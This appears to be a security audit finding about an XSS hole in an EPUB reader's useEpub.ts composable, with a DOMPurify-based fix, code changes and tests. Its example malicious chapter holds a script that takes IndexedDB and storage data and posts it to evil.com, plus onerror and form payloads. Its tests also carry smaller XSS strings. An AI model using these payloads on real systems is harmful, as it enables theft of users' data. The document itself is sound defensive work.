# XSS Vulnerability via Unsafe EPUB Content Processing in useEpub Composable

## Severity
Critical

## Affected Files
- `src/composables/useEpub.ts:437-445` (loadChapterContent function)
- `src/composables/useEpub.ts:547-549` (processImages function)
- `src/composables/useEpub.ts:395-399` (Chapter content parsing)

## Description
The `useEpub.ts` composable processes EPUB chapter content and returns raw `innerHTML` from parsed EPUB files without any sanitization. This content is then used directly in the `BookViewer.vue` component via `innerHTML`, creating a critical XSS vulnerability.

```typescript
// Lines 437-445 in useEpub.ts - loadChapterContent function
let innerHTML = body.innerHTML;
if (!innerHTML || innerHTML.trim() === '') {
  console.warn(`Empty body in chapter: ${title} (${chapterPath})`);
  return `<p>Empty chapter: ${title}</p>`;
}

innerHTML = await processImages(innerHTML, archiveZip, baseUrl, chapterPath);

return innerHTML; // UNSAFE: Returns un sanitized HTML
```

Additionally, the `processImages` function processes HTML and returns it directly:
```typescript
// Lines 547-549 in useEpub.ts - processImages function
const result = doc.querySelector('div');
return result ? result.innerHTML : html; // UNSAFE: Returns un sanitized HTML
```

The chapter content is also parsed from raw EPUB files without validation:
```typescript
// Lines 395-399 in useEpub.ts
const xhtml = await zipFile.async('string');
if (!xhtml || xhtml.trim() === '') {
  console.warn(`Empty chapter content: ${title} (${chapterPath})`);
  return `<p>Empty chapter: ${title}</p>`;
}

const parser = new DOMParser();
const doc = parser.parseFromString(xhtml, 'application/xhtml+xml'); // NO SANITIZATION
```

## Potential Attack Vectors
1. **Script Injection**: EPUB files with embedded `<script>` tags execute on load
2. **Event Handler Injection**: `<img src=x onerror="maliciousCode()">` triggers on image load
3. **External Resource Loading**: Malicious EPUB can load external scripts via `<script src="evil.js">`
4. **Form Phishing**: Attackers inject fake forms to capture user data
5. **DOM Pollution**: Malicious content can modify application state via DOM manipulation
6. **Data Exfiltration**: Scripts can steal IndexedDB book library, user preferences, and local storage
7. **Clickjacking**: Invisible elements can hijack user interactions

### Example Malicious EPUB Chapter Content
```html
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
  <h1>Chapter 1</h1>
  <p>This is the chapter content.</p>
  
  <!-- Malicious script that steals user's book library -->
  <script>
    (async () => {
      // Steal all books from IndexedDB
      const dbRequest = indexedDB.open('epub-web-reader', 2);
      const db = await new Promise((resolve, reject) => {
        dbRequest.onsuccess = () => resolve(dbRequest.result);
        dbRequest.onerror = () => reject(dbRequest.error);
      });
      
      const books = await new Promise((resolve, reject) => {
        const tx = db.transaction('books', 'readonly');
        const store = tx.objectStore('books');
        const request = store.getAll();
        request.onsuccess = () => resolve(request.result);
        request.onerror = () => reject(request.error);
      });
      
      // Send stolen data to attacker
      await fetch('https://evil.com/exfiltrate', {
        method: 'POST',
        body: JSON.stringify({ books, localStorage: localStorage, sessionStorage: sessionStorage })
      });
    })();
  </script>
  
  <!-- Image-based XSS -->
  <img src="nonexistent.png" onerror="fetch('https://evil.com/ping', {method: 'POST'})">
  
  <!-- Phishing form -->
  <form action="https://evil.com/steal-credentials" method="POST">
    <input name="title" value="{{ book.title }}">
    <input name="progress" value="{{ book.progress }}">
  </form>
</body>
</html>
```

## Implementation Plan

### Step 1: Install DOMPurify
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### Step 2: Create comprehensive sanitization utility
Create `src/utils/sanitize.ts`:
```typescript
import DOMPurify from 'dompurify';

// Configure DOMPurify for EPUB content
const EPUB_CONFIG = {
  ALLOWED_TAGS: [
    // Structural elements
    'div', 'span', 'br', 'hr', 'wbr',
    // Headings
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // Text formatting
    'p', 'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'sub', 'sup',
    // Lists
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    // Quotations
    'blockquote', 'q', 'cite',
    // Links and images (strict validation in separate function)
    'a', 'img',
    // Tables
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'col', 'colgroup',
    // Code
    'pre', 'code', 'kbd', 'samp',
    // Semantic HTML5
    'section', 'article', 'aside', 'header', 'footer', 'nav', 'main', 'figure', 'figcaption',
    // Other
    'mark', 'small', 'abbr', 'bdo', 'ruby', 'rt', 'rp', 'time', 'data', 'address'
  ],
  ALLOWED_ATTR: [
    'href', 'src', 'alt', 'title', 'id', 'class', 'style',
    'lang', 'xml:lang', 'dir', 'translate',
    'colspan', 'rowspan', 'headers', 'scope',
    'cite', 'datetime', 'data-*'
  ],
  FORBID_TAGS: [
    'script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'button',
    'textarea', 'select', 'option', 'fieldset', 'legend', 'label', 'output',
    'audio', 'video', 'source', 'track', 'canvas', 'svg', 'math', 'details', 'summary'
  ],
  FORBID_ATTR: [
    'onerror', 'onload', 'onclick', 'onmouseover', 'onmouseout', 'onfocus', 'onblur',
    'onsubmit', 'onreset', 'onchange', 'oninput', 'onkeydown', 'onkeyup',
    'onmousedown', 'onmouseup', 'onmousemove', 'ontouchstart', 'ontouchend',
    'formaction', 'xlink:href'
  ],
  ALLOWED_URI_REGEXP: new RegExp('^(http:|https:|mailto:|tel:|#|blob:|data:image/)'),
  ADD_ATTR: ['loading'],
  KEEP_CONTENT: true,
  FORCE_BODY: true
};

/**
 * Sanitize EPUB chapter content
 */
export function sanitizeEpubContent(dirty: string): string {
  return DOMPurify.sanitize(dirty, EPUB_CONFIG);
}

/**
 * Sanitize search excerpts (only allow mark tags)
 */
export function sanitizeSearchExcerpt(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['mark'],
    ALLOWED_ATTR: ['class'],
    KEEP_CONTENT: true,
    FORCE_BODY: false
  });
}

/**
 * Validate and sanitize image sources
 */
export function sanitizeImageSrc(src: string): string | null {
  if (!src) return null;
  
  // Allow blob: URLs (created by us)
  if (src.startsWith('blob:')) {
    return src;
  }
  
  // Allow data: image URLs (from EPUB)
  if (src.startsWith('data:image/')) {
    // Validate it's actually an image
    const match = src.match(/^data:image\/(png|jpeg|jpg|gif|webp|svg\+xml);base64,/i);
    if (match) {
      return src;
    }
    return null;
  }
  
  // Allow http/https URLs
  if (src.startsWith('http://') || src.startsWith('https://')) {
    try {
      const url = new URL(src);
      // Only allow specific image CDN domains if needed
      return src;
    } catch {
      return null;
    }
  }
  
  // Reject everything else (javascript:, vbscript:, data: with non-image, etc.)
  return null;
}

/**
 * Validate and sanitize link hrefs
 */
export function sanitizeLinkHref(href: string): string | null {
  if (!href) return null;
  
  // Allow fragment identifiers
  if (href.startsWith('#')) {
    return href;
  }
  
  // Allow http/https
  if (href.startsWith('http://') || href.startsWith('https://')) {
    try {
      const url = new URL(href);
      // Block known tracking/malicious domains
      const blockedDomains = ['evil.com', 'malicious-site.com'];
      if (blockedDomains.some(domain => url.hostname.includes(domain))) {
        return null;
      }
      return href;
    } catch {
      return null;
    }
  }
  
  // Allow mailto/tel
  if (href.startsWith('mailto:') || href.startsWith('tel:')) {
    return href;
  }
  
  return null;
}
```

### Step 3: Update loadChapterContent in useEpub.ts
```typescript
import { sanitizeEpubContent, sanitizeImageSrc } from '@/utils/sanitize';

// In loadChapterContent function...

let innerHTML = body.innerHTML;
if (!innerHTML || innerHTML.trim() === '') {
  console.warn(`Empty body in chapter: ${title} (${chapterPath})`);
  return sanitizeEpubContent(`<p>Empty chapter: ${title}</p>`);
}

innerHTML = await processImages(innerHTML, archiveZip, baseUrl, chapterPath);

// SANITIZE BEFORE RETURNING
return sanitizeEpubContent(innerHTML);
```

### Step 4: Update processImages in useEpub.ts
```typescript
// In processImages function...

for (const img of images) {
  const src = img.getAttribute('src');
  if (!src) continue;

  if (imageUrls.has(src)) {
    img.setAttribute('src', imageUrls.get(src)!);
    continue;
  }

  if (src.startsWith('data:')) {
    // Validate data: URLs
    const sanitized = sanitizeImageSrc(src);
    if (!sanitized) {
      img.removeAttribute('src');
      continue;
    }
    continue;
  }

  const resolvedPath = await resolveImagePath(src, baseUrl, chapterPath);
  let normalizedPath = resolvedPath.replace(/^\//, '');
  normalizedPath = decodeURIComponent(normalizedPath);

  // ... existing blob loading code ...

  try {
    const blob = await zipFile.async('blob');
    const blobUrl = URL.createObjectURL(blob);
    imageUrls.set(src, blobUrl);
    img.setAttribute('src', blobUrl); // blob: URLs are safe
  } catch (err) {
    console.warn(`Failed to load image: ${normalizedPath}`, err);
    img.removeAttribute('src'); // Remove invalid src
  }
}

const result = doc.querySelector('div');
const html = result ? result.innerHTML : html;

// SANITIZE BEFORE RETURNING
return sanitizeEpubContent(html);
```

### Step 5: Update getTitleFromChapter to sanitize titles
```typescript
// In getTitleFromChapter function...
const titleEl = doc.querySelector('title');
// Use textContent, not innerHTML - it's safer
return titleEl?.textContent?.trim() || '';
```

### Step 6: Update loadTocFromNcx to sanitize TOC entries
```typescript
// In loadTocFromNcx function...
const title = navLabel?.textContent?.trim() || 'Untitled';
// textContent is safe - it won't execute scripts
```

### Step 7: Add comprehensive tests
Create `tests/epub-sanitize.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { sanitizeEpubContent, sanitizeImageSrc, sanitizeLinkHref } from '@/utils/sanitize';

describe('sanitizeEpubContent', () => {
  it('should remove script tags', () => {
    const input = '<div><script>alert("XSS")</script></div>';
    const output = sanitizeEpubContent(input);
    expect(output).not.toContain('<script');
    expect(output).not.toContain('alert');
  });

  it('should remove iframe tags', () => {
    const input = '<iframe src="evil.com"></iframe>';
    const output = sanitizeEpubContent(input);
    expect(output).not.toContain('<iframe');
  });

  it('should remove event handlers', () => {
    const input = '<img src="test.jpg" onerror="alert(1)">';
    const output = sanitizeEpubContent(input);
    expect(output).not.toContain('onerror');
  });

  it('should preserve valid HTML structure', () => {
    const input = '<p>Test <strong>content</strong> with <a href="#link">link</a>.</p>';
    const output = sanitizeEpubContent(input);
    expect(output).toContain('<p>');
    expect(output).toContain('<strong>content</strong>');
    expect(output).toContain('<a href="#link">link</a>');
  });

  it('should remove form tags', () => {
    const input = '<form action="evil.com"><input type="text"></form>';
    const output = sanitizeEpubContent(input);
    expect(output).not.toContain('<form');
    expect(output).not.toContain('<input');
  });
});

describe('sanitizeImageSrc', () => {
  it('should allow blob URLs', () => {
    const src = 'blob:http://localhost/1234-5678';
    expect(sanitizeImageSrc(src)).toBe(src);
  });

  it('should allow data:image URLs', () => {
    const src = 'data:image/png;base64,iVBORw0KGgo=';
    expect(sanitizeImageSrc(src)).toBe(src);
  });

  it('should reject data URLs with non-image types', () => {
    const src = 'data:text/html,<script>alert(1)</script>';
    expect(sanitizeImageSrc(src)).toBeNull();
  });

  it('should reject javascript URLs', () => {
    const src = 'javascript:alert(1)';
    expect(sanitizeImageSrc(src)).toBeNull();
  });
});

describe('sanitizeLinkHref', () => {
  it('should allow fragment identifiers', () => {
    const href = '#chapter1';
    expect(sanitizeLinkHref(href)).toBe(href);
  });

  it('should allow https URLs', () => {
    const href = 'https://example.com';
    expect(sanitizeLinkHref(href)).toBe(href);
  });

  it('should allow mailto links', () => {
    const href = 'mailto:test@example.com';
    expect(sanitizeLinkHref(href)).toBe(href);
  });

  it('should reject javascript URLs', () => {
    const href = 'javascript:alert(1)';
    expect(sanitizeLinkHref(href)).toBeNull();
  });
});
```

## Additional Recommendations
1. **Implement EPUB Signature Validation**: Verify EPUB files are valid and signed
2. **Add File Size Limits**: Prevent DoS via large EPUB files
3. **Chunked Loading**: Process large EPUBs in chunks to prevent memory exhaustion
4. **Sandbox Iframe Rendering**: Consider rendering EPUB content in a sandboxed iframe for additional isolation
5. **Content-Type Validation**: Verify uploaded files are actually EPUB files
6. **Audit Trail**: Log suspicious EPUB loading attempts

## Related Issues
- See also: `xss-via-unsafe-innerhtml-bookviewer.md` (BookViewer component sanitization)
- See also: `xss-via-unsafe-vhtml-searchpanel.md` (Search panel sanitization)
